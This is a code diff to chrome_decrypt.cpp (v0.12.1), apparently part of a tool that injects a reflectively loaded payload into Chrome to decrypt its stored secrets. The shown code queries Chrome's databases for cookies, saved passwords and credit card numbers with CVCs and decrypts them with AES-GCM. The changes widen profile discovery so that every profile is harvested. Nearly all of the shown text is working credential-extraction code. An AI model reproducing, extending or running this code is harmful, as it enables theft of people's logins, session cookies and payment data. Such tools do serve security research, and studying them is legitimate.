@@ -1,5 +1,5 @@
 // chrome_decrypt.cpp
-// v0.12.0 (c) Alexander 'xaitax' Hagenah
+// v0.12.1 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -22,6 +22,7 @@
 #include <functional>
 #include <any>
 #include <unordered_map>
+#include <set>
 
 #include "reflective_loader.h"
 #include "sqlite3.h"
@@ -232,7 +233,13 @@ namespace Payload
 
         std::vector<uint8_t> DecryptGcm(const std::vector<uint8_t> &key, const std::vector<uint8_t> &blob)
         {
-            if (blob.size() <= (V20_PREFIX.length() + GCM_IV_LENGTH + GCM_TAG_LENGTH) || memcmp(blob.data(), V20_PREFIX.c_str(), V20_PREFIX.length()) != 0)
+            const size_t GCM_OVERHEAD_LENGTH = V20_PREFIX.length() + GCM_IV_LENGTH + GCM_TAG_LENGTH;
+
+            if (blob.size() == GCM_OVERHEAD_LENGTH && memcmp(blob.data(), V20_PREFIX.c_str(), V20_PREFIX.length()) != 0)
+            {
+                return {};
+            }
+            if (blob.size() < GCM_OVERHEAD_LENGTH || memcmp(blob.data(), V20_PREFIX.c_str(), V20_PREFIX.length()) != 0)
             {
                 throw std::runtime_error("GCM blob is invalid.");
             }
@@ -253,7 +260,7 @@ namespace Payload
 
             const uint8_t *iv = blob.data() + V20_PREFIX.length();
             const uint8_t *ct = iv + GCM_IV_LENGTH;
-            const uint8_t *tag = blob.data() + blob.size() - GCM_TAG_LENGTH;
+            const uint8_t *tag = blob.data() + (blob.size() - GCM_TAG_LENGTH);
             ULONG ct_len = static_cast<ULONG>(blob.size() - V20_PREFIX.length() - GCM_IV_LENGTH - GCM_TAG_LENGTH);
 
             BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
@@ -317,8 +324,7 @@ namespace Payload
         const std::vector<ExtractionConfig> &GetExtractionConfigs()
         {
             static const std::vector<ExtractionConfig> configs = {
-                {
-                 fs::path("Network") / "Cookies", "cookies", "SELECT host_key, name, encrypted_value FROM cookies;",
+                {fs::path("Network") / "Cookies", "cookies", "SELECT host_key, name, encrypted_value FROM cookies;",
                  nullptr,
                  [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                  {
@@ -341,8 +347,7 @@ namespace Payload
                          return std::nullopt;
                      }
                  }},
-                {
-                 "Login Data", "passwords", "SELECT origin_url, username_value, password_value FROM logins;",
+                {"Login Data", "passwords", "SELECT origin_url, username_value, password_value FROM logins;",
                  nullptr,
                  [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                  {
@@ -361,8 +366,7 @@ namespace Payload
                          return std::nullopt;
                      }
                  }},
-                {
-                 "Web Data", "payments", "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;",
+                {"Web Data", "payments", "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;",
                  [](sqlite3 *db) -> std::optional<std::any>
                  {
                      auto cvcMap = std::make_shared<std::unordered_map<std::string, std::vector<uint8_t>>>();
@@ -547,27 +551,54 @@ namespace Payload
         void ExtractAllData(const std::vector<uint8_t> &aesKey)
         {
             fs::path userDataRoot = Utils::GetLocalAppDataPath() / m_config.userDataSubPath;
-            std::vector<fs::path> profilePaths;
-            if (fs::exists(userDataRoot / "Default"))
-                profilePaths.push_back(userDataRoot / "Default");
+            std::set<fs::path> uniqueProfilePaths;
+
+            if (fs::exists(userDataRoot))
+            {
+                bool isRootProfile = false;
+                for (const auto &dataCfg : Data::GetExtractionConfigs())
+                {
+                    if (fs::exists(userDataRoot / dataCfg.dbRelativePath))
+                    {
+                        isRootProfile = true;
+                        break;
+                    }
+                }
+                if (isRootProfile)
+                {
+                    uniqueProfilePaths.insert(userDataRoot);
+                }
+            }
+
             try
             {
                 for (const auto &entry : fs::directory_iterator(userDataRoot))
                 {
-                    if (entry.is_directory() && entry.path().filename().string().rfind("Profile ", 0) == 0)
+                    bool isProfileCandidate = false;
+                    for (const auto &dataCfg : Data::GetExtractionConfigs())
                     {
-                        profilePaths.push_back(entry.path());
+                        if (fs::exists(entry.path() / dataCfg.dbRelativePath))
+                        {
+                            isProfileCandidate = true;
+                            break;
+                        }
+                    }
+                    if (isProfileCandidate)
+                    {
+                        uniqueProfilePaths.insert(entry.path());
                     }
                 }
             }
-            catch (...)
+            catch (const fs::filesystem_error &ex)
             {
+                Log("[-] Filesystem ERROR during profile discovery: " + std::string(ex.what()));
+            }
+            catch (const std::exception &ex)
+            {
+                Log("[-] Generic ERROR during profile discovery: " + std::string(ex.what()));
             }
 
-            if (profilePaths.empty() && (fs::exists(userDataRoot / "Network") || fs::exists(userDataRoot / "Login Data")))
-            {
-                profilePaths.push_back(userDataRoot);
-            }
+            std::vector<fs::path> profilePaths(uniqueProfilePaths.begin(), uniqueProfilePaths.end());
 
             for (const auto &profilePath : profilePaths)
             {
